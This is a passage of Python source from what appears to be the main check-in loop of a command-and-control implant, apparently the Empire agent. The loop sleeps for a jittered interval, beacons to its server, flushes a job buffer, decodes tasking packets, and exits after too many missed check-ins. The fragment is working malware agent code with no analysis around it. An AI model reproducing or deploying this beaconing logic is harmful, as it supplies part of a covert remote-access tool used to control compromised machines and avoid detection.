                send_message(build_response_packet(2, msg))
                agent_exit()

        # exit if we miss commnicating with the server enough times
        if missedCheckins >= lostLimit:
            agent_exit()

        # sleep for the randomized interval
        if jitter < 0: jitter = -jitter
        if jitter > 1: jitter = old_div(1, jitter)
        minSleep = int((1.0 - jitter) * delay)
        maxSleep = int((1.0 + jitter) * delay)

        sleepTime = random.randint(minSleep, maxSleep)
        time.sleep(sleepTime)

        (code, data) = send_message()

        if code == '200':
            try:
                send_job_message_buffer()
            except Exception as e:
                result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
                process_job_tasking(result)
            if data.strip() == defaultResponse.strip():
                missedCheckins = 0
            else:
                decode_routing_packet(data)
        else:
            pass
            # print "invalid code:",code

    except Exception as e:
        print("main() exception: %s" % (e))
